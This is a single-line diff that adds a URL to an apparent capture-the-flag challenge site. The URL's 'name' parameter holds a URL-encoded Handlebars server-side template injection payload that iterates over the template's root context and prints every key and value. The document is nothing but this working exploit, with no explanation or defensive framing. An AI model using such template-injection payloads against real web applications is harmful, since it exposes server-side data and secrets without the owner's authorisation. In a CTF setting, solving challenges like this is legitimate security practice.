@@ -1,0 +1,1 @@
+https://double-ssti.chal.h4ck3r.quest/welcome?name=%7B%7B%23each%20%40root%7D%7D%20%7B%7B%40key%7D%7D%3A%20%7B%7B%20this%20%7D%7D%20%7B%7B%2Feach%7D%7D
